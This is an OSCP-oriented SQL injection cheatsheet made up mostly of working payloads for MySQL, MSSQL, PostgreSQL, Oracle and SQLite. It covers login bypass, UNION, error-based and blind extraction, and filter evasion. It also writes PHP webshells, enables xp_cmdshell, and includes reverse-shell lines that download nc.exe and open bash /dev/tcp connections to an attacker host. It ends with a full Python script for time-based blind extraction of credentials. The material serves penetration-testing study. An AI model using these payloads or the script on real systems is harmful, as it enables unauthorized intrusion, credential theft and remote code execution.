# 💉 SQL Injection Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> SQL Injection occurs when user input is not properly sanitized and is passed directly to a SQL query.

---

## 📋 Table of Contents
- [Detection & Confirmation](#-detection--confirmation)
- [MySQL Injection](#-mysql-injection)
- [MSSQL Injection](#-mssql-injection)
- [PostgreSQL Injection](#-postgresql-injection)
- [Oracle Injection](#-oracle-injection)
- [SQLite Injection](#-sqlite-injection)
- [Login Bypass](#-login-bypass)
- [UNION Based Injection](#-union-based-injection)
- [Error Based Injection](#-error-based-injection)
- [Blind Boolean Based](#-blind-boolean-based)
- [Time Based Blind](#-time-based-blind)
- [File Read & Write](#-file-read--write)
- [Command Execution](#-command-execution)
- [WAF Bypass](#-waf-bypass)
- [Manual Exploitation Script](#-manual-exploitation-script)
- [Quick Decision Guide](#-quick-decision-guide)

---

## 🔍 Detection & Confirmation

### Basic Detection Payloads
```sql
-- Single quote (most common first test)
'

-- Double quote
"

-- Comment termination
--
#
/*

-- Boolean test
' OR 1=1--
' OR 1=2--

-- Stacked queries test
'; SELECT 1--

-- Numeric context
1 AND 1=1
1 AND 1=2
```

### Identify the Database Type
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT SERVERPROPERTY('productversion')

-- PostgreSQL
SELECT version()

-- Oracle
SELECT * FROM v$version

-- SQLite
SELECT sqlite_version()
```

### Error Messages that Reveal DB Type
```
MySQL:      "You have an error in your SQL syntax"
MSSQL:      "Incorrect syntax near"
PostgreSQL: "ERROR: unterminated quoted string"
Oracle:     "ORA-01756: quoted string not properly terminated"
SQLite:     "SQLite3::query(): Unable to prepare statement"
```

---

## 🐬 MySQL Injection

### Enumeration
```sql
-- Database version
' UNION SELECT @@version,NULL--

-- Current database
' UNION SELECT database(),NULL--

-- Current user
' UNION SELECT user(),NULL--

-- All databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- All tables in current DB
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- All columns in a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Dump users table
' UNION SELECT username,password FROM users--

-- Concatenate multiple columns
' UNION SELECT concat(username,':',password),NULL FROM users--
```

### File Operations
```sql
-- Read file (needs FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Write webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### Stacked Queries
```sql
-- MySQL does NOT support stacked queries in most contexts
-- Use UNION or blind techniques instead
```

---

## 🪟 MSSQL Injection

### Enumeration
```sql
-- Version
' UNION SELECT @@version,NULL--

-- Current database
' UNION SELECT db_name(),NULL--

-- Current user
' UNION SELECT SYSTEM_USER,NULL--

-- All databases
' UNION SELECT name,NULL FROM master..sysdatabases--

-- All tables in current DB
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- All tables in specific DB
' UNION SELECT name,NULL FROM <dbname>..sysobjects WHERE xtype='U'--

-- All columns in a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Dump users table
' UNION SELECT username,password FROM users--

-- Linked servers (pivoting potential)
' UNION SELECT name,NULL FROM master..sysservers--
```

### Stacked Queries (MSSQL supports these)
```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Execute OS command
'; EXEC xp_cmdshell('whoami');--

-- Use variable to avoid quote issues
'; DECLARE @cmd varchar(500); SET @cmd='whoami'; EXEC xp_cmdshell(@cmd);--

-- Time delay (confirm stacked queries work)
'; WAITFOR DELAY '0:0:5';--
```

### MSSQL Specific Functions
```sql
-- Check if sysadmin
' UNION SELECT IS_SRVROLEMEMBER('sysadmin'),NULL--

-- Check current privileges
' UNION SELECT IS_MEMBER('db_owner'),NULL--

-- Get SQL Server service account
'; EXEC xp_cmdshell('whoami');--

-- Read file via OPENROWSET
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) x--
```

---

## 🐘 PostgreSQL Injection

### Enumeration
```sql
-- Version
' UNION SELECT version(),NULL--

-- Current database
' UNION SELECT current_database(),NULL--

-- Current user
' UNION SELECT current_user,NULL--

-- All databases
' UNION SELECT datname,NULL FROM pg_database--

-- All tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- All columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Command Execution
```sql
-- Via COPY command (needs superuser)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';--

-- Read file
' UNION SELECT pg_read_file('/etc/passwd',0,1000000),NULL--

-- Large Object RCE
'; SELECT lo_export(lo_from_bytea(0, decode('4d5a...hex...','hex')), '/tmp/shell.so');--
```

---

## 🔶 Oracle Injection

### Enumeration
```sql
-- Version
' UNION SELECT banner,NULL FROM v$version--

-- Current user
' UNION SELECT user,NULL FROM dual--

-- All tables
' UNION SELECT table_name,NULL FROM all_tables--

-- All columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- NOTE: Oracle requires FROM clause — use FROM dual for single rows
' UNION SELECT NULL,NULL FROM dual--
```

---

## 📦 SQLite Injection

### Enumeration
```sql
-- Version
' UNION SELECT sqlite_version(),NULL--

-- All tables
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--

-- Table schema (get column names)
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--

-- Dump data
' UNION SELECT username,password FROM users--
```

---

## 🔐 Login Bypass

### Classic Payloads (try in username field)
```sql
' OR 1=1--
' OR 1=1-- -
' OR 1=1#
' OR '1'='1'--
' OR 'a'='a'--
admin'--
admin'#
') OR 1=1--
')) OR 1=1--
' OR 1=1/*
```

### When Username is Known
```sql
-- Bypass with known username
admin'--
administrator'--
admin' #

-- With password field
# Username: admin
# Password: ' OR '1'='1
```

### MSSQL Specific Bypass
```sql
' OR 1=1--
'; IF 1=1 SELECT 1--
admin' OR 1=1--
```

### If Parentheses are Used in Query
```sql
') OR ('1'='1
') OR 1=1--
')) OR 1=1--
```

> 💡 **Tip:** If `'` gives a syntax error but `' OR 1=1--` gives "invalid credentials", the injection point exists but the logic isn't matching. Try different comment styles (`--`, `#`, `/*`) and wrapping (`'`, `"`, `)`).

---

## 🔗 UNION Based Injection

### Step 1 — Find Number of Columns
```sql
-- Keep adding NULLs until no error
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Alternative using ORDER BY
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--        ← error here means 2 columns
```

### Step 2 — Find Printable Columns
```sql
-- Replace NULL with string to find which columns display
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
' UNION SELECT 'a','a'--
```

### Step 3 — Extract Data
```sql
-- MySQL/MSSQL/PostgreSQL
' UNION SELECT username,password FROM users--

-- Concatenate into one column if needed
' UNION SELECT concat(username,':',password),NULL FROM users--   -- MySQL
' UNION SELECT username+':'+password,NULL FROM users--           -- MSSQL
' UNION SELECT username||':'||password,NULL FROM users--         -- PostgreSQL/Oracle
```

---

## ❌ Error Based Injection

### MySQL Error Based
```sql
-- extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- updatexml
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- Double query
' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MSSQL Error Based
```sql
-- CONVERT error (most common)
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,db_name())--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- Get second row
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE password NOT IN ('first_password')))--
```

### PostgreSQL Error Based
```sql
-- CAST error
' AND CAST(version() AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

---

## 👁️ Blind Boolean Based

### Concept
```
True condition  → normal page response
False condition → different/empty response
Extract data by testing one character at a time
```

### MySQL Boolean Blind
```sql
-- Test if first character of database name is 'a'
' AND SUBSTRING(database(),1,1)='a'--

-- Test character by position
' AND SUBSTRING(database(),2,1)='b'--

-- Get length first
' AND LENGTH(database())=5--

-- Extract table name
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='u'--

-- Extract password
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='p'--
```

### MSSQL Boolean Blind
```sql
-- Test character
' AND SUBSTRING(db_name(),1,1)='m'--

-- Using ASCII for reliability
' AND ASCII(SUBSTRING(db_name(),1,1))=109--

-- Extract table name
' AND SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)='u'--
```

---

## ⏱️ Time Based Blind

### Concept
```
Condition TRUE  → page delays
Condition FALSE → page responds normally
Use to extract data when no visual difference exists
```

### MySQL Time Based
```sql
-- Confirm injection
' AND SLEEP(5)--

-- Conditional delay
' AND IF(1=1,SLEEP(5),0)--

-- Extract data
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='p',SLEEP(5),0)--
```

### MSSQL Time Based
```sql
-- Confirm injection
'; WAITFOR DELAY '0:0:5';--
' WAITFOR DELAY '0:0:5'--

-- Conditional delay
'; IF (1=1) WAITFOR DELAY '0:0:5';--

-- Extract data character by character
'; IF (SUBSTRING(db_name(),1,1)='m') WAITFOR DELAY '0:0:5';--
'; IF (SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)='u') WAITFOR DELAY '0:0:5';--
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='p') WAITFOR DELAY '0:0:5';--

-- Using DECLARE to avoid syntax errors
'; DECLARE @r varchar(1); SET @r=SUBSTRING(db_name(),1,1); IF @r='m' WAITFOR DELAY '0:0:5';--
```

### PostgreSQL Time Based
```sql
-- Confirm injection
'; SELECT pg_sleep(5);--

-- Conditional delay
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Extract data
' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

---

## 📁 File Read & Write

### MySQL
```sql
-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL--

-- Write webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/cmd.php'--
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO DUMPFILE '/var/www/html/cmd.php'--
```

### MSSQL
```sql
-- Read file via OPENROWSET
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) x--

-- Write file via xp_cmdshell
'; EXEC xp_cmdshell('echo ^<?php system($_GET[cmd]); ?^> > C:\inetpub\wwwroot\cmd.php');--
```

### PostgreSQL
```sql
-- Read file (superuser required)
' UNION SELECT pg_read_file('/etc/passwd',0,1000000),NULL--

-- Write file
' UNION SELECT 'data',NULL INTO OUTFILE '/tmp/test.txt'--

-- Write webshell via COPY
'; COPY (SELECT '<?php system($_GET[''cmd'']); ?>') TO '/var/www/html/cmd.php';--
```

---

## 💻 Command Execution

### MSSQL — xp_cmdshell
```sql
-- Enable and execute
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell('whoami');--

-- Download and execute
'; EXEC xp_cmdshell('certutil -urlcache -f http://<kali_ip>/nc.exe C:\Windows\Temp\nc.exe');--
'; EXEC xp_cmdshell('C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe');--

-- Use DECLARE to avoid quote issues
'; DECLARE @c varchar(500); SET @c='cmd /c whoami > C:\Windows\Temp\out.txt'; EXEC xp_cmdshell(@c);--
```

### MySQL — Into Outfile Webshell
```sql
-- Write PHP webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Execute commands
# http://target/shell.php?cmd=id
# http://target/shell.php?cmd=whoami
```

### PostgreSQL — COPY TO PROGRAM
```sql
-- RCE via COPY (superuser required)
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<kali_ip>/9001 0>&1"';--
```

---

## 🛡️ WAF Bypass

### Case Variation
```sql
sElEcT * fRoM users
UNION/**/SELECT
```

### Comment Injection
```sql
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/
UNION%20SELECT
```

### Encoding
```sql
-- URL encoding
%27 OR %271%27=%271

-- Double URL encoding
%2527

-- Unicode
ʼ OR 1=1--    (Unicode apostrophe)
```

### Whitespace Alternatives
```sql
-- Use comments instead of spaces
UNION/**/SELECT/**/username/**/FROM/**/users

-- Use brackets
UNION(SELECT(username)FROM(users))

-- Tab, newline
UNION	SELECT	username	FROM	users
```

### String Concatenation (bypass keyword filters)
```sql
-- MySQL
'ad'+'min'
CONCAT('sel','ect')

-- MSSQL
'ad'+'min'
```

---

## 🐍 Manual Exploitation Script

> Use this for OSCP exam (sqlmap is not allowed)

```python
import requests
import time
import string

url = "http://TARGET/login.aspx"
charset = string.ascii_letters + string.digits + "_@.!#$"
DELAY = 5
THRESHOLD = 4

session = requests.Session()

def get_viewstate():
    """Fetch fresh VIEWSTATE tokens for ASP.NET targets"""
    from bs4 import BeautifulSoup
    r = session.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    vs = soup.find('input', {'name': '__VIEWSTATE'})
    vsg = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})
    ev = soup.find('input', {'name': '__EVENTVALIDATION'})
    return (
        vs['value'] if vs else '',
        vsg['value'] if vsg else '',
        ev['value'] if ev else ''
    )

def check_delay(payload, use_viewstate=False):
    """Send payload and check if response is delayed"""
    try:
        if use_viewstate:
            vs, vsg, ev = get_viewstate()
            data = {
                "__VIEWSTATE": vs,
                "__VIEWSTATEGENERATOR": vsg,
                "__EVENTVALIDATION": ev,
                "ctl00$ContentPlaceHolder1$UsernameTextBox": payload,
                "ctl00$ContentPlaceHolder1$PasswordTextBox": "test",
                "ctl00$ContentPlaceHolder1$LoginButton": "Login"
            }
        else:
            data = {"username": payload, "password": "test"}

        start = time.time()
        session.post(url, data=data, timeout=15)
        elapsed = time.time() - start
        print(f"  [-] Response time: {elapsed:.2f}s | Payload: {payload[:60]}")
        return elapsed >= THRESHOLD
    except Exception as e:
        print(f"  [!] Error: {e}")
        return False

def extract_value(query, use_viewstate=False):
    """Extract a string value character by character via time-based blind"""
    result = ""
    position = 1
    while True:
        found = False
        for char in charset:
            # MSSQL payload
            payload = f"'; IF (SUBSTRING(({query}),{position},1)='{char}') WAITFOR DELAY '0:0:{DELAY}';--"
            # MySQL payload (uncomment if target is MySQL):
            # payload = f"' AND IF(SUBSTRING(({query}),{position},1)='{char}',SLEEP({DELAY}),0)--"
            if check_delay(payload, use_viewstate):
                result += char
                print(f"  [+] Position {position}: '{char}' → {result}")
                found = True
                break
        if not found:
            print(f"  [*] Complete: {result}")
            break
        position += 1
    return result

# ── Main ──────────────────────────────────────────────────────────────────────

print("[*] Testing time delay...")
if check_delay("'; WAITFOR DELAY '0:0:5';--"):
    print("[+] MSSQL time-based blind confirmed!\n")
else:
    print("[-] MSSQL failed. Try MySQL: ' AND SLEEP(5)--\n")
    exit()

print("[*] Extracting database name...")
db = extract_value("SELECT db_name()")
print(f"\n[+] Database: {db}\n")

print("[*] Extracting first table name...")
table1 = extract_value(f"SELECT TOP 1 table_name FROM {db}..information_schema.tables")
print(f"\n[+] Table 1: {table1}\n")

print("[*] Extracting second table name...")
table2 = extract_value(f"SELECT TOP 1 table_name FROM {db}..information_schema.tables WHERE table_name NOT IN ('{table1}')")
print(f"\n[+] Table 2: {table2}\n")

print(f"[*] Extracting first username from {table1}...")
user = extract_value(f"SELECT TOP 1 username FROM {table1}")
print(f"\n[+] Username: {user}\n")

print(f"[*] Extracting password for {user}...")
passwd = extract_value(f"SELECT TOP 1 password FROM {table1} WHERE username='{user}'")
print(f"\n[+] Password: {passwd}\n")
```

---

## 🗺️ Quick Decision Guide

| Situation | Technique |
|-----------|-----------|
| Error on `'` | SQLi confirmed — identify DB from error message |
| Login page | Try login bypass payloads first |
| Output visible | UNION based injection |
| Error messages visible | Error based injection |
| True/false response difference | Boolean blind injection |
| No visible difference at all | Time based blind injection |
| MSSQL identified | Try xp_cmdshell for RCE |
| MySQL + file write perm | Write webshell via INTO OUTFILE |
| PostgreSQL + superuser | COPY TO PROGRAM for RCE |
| WAF blocking payloads | Try comment injection / encoding |

---

## 📋 SQLi Testing Checklist

```
[ ] 1.  Test with single quote ' — does it error?
[ ] 2.  Test with ' OR 1=1-- — login bypass
[ ] 3.  Identify database type from error message
[ ] 4.  Determine number of columns (ORDER BY / UNION NULL)
[ ] 5.  Find printable columns (UNION SELECT 'a')
[ ] 6.  Extract DB name / version
[ ] 7.  Extract table names
[ ] 8.  Extract column names
[ ] 9.  Dump credentials
[ ] 10. Check for file read (LOAD_FILE / pg_read_file)
[ ] 11. Check for file write (INTO OUTFILE / COPY TO)
[ ] 12. Check for command execution (xp_cmdshell / COPY TO PROGRAM)
[ ] 13. Try stacked queries (MSSQL/PostgreSQL)
[ ] 14. If blind — use time-based extraction script
```

---

## 💡 Pro Tips

- **Always try login bypass first** — fastest path if it's a login page
- **MSSQL + stacked queries = xp_cmdshell** — the holy grail for Windows targets
- **`WAITFOR DELAY` not working?** — Try `'; DECLARE @d varchar(10); SET @d='0:0:5'; WAITFOR DELAY @d;--`
- **Quote issues in xp_cmdshell?** — Use `DECLARE @c varchar(500); SET @c='your command'; EXEC xp_cmdshell(@c);--`
- **ASP.NET pages** — always fetch fresh VIEWSTATE token before each injection attempt
- **UNION column count** — use `ORDER BY` method, it's more reliable than adding NULLs
- **Boolean blind vs time blind** — boolean is faster; time blind is the fallback when no response difference
- **Error messages = free information** — never suppress them in your test environment
- **sqlmap is NOT allowed in OSCP** — practice manual techniques with the script above

---

## ⚠️ OSCP Exam Notes

| Technique | Allowed? |
|-----------|---------|
| Manual SQLi | ✅ Yes — fully allowed |
| Custom Python scripts | ✅ Yes |
| Burp Suite (intercept/repeat) | ✅ Yes |
| sqlmap | ❌ Not allowed |
| sqlmap for enumeration only | ❌ Still not allowed |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

*Generated for OSCP PEN-200 exam preparation*
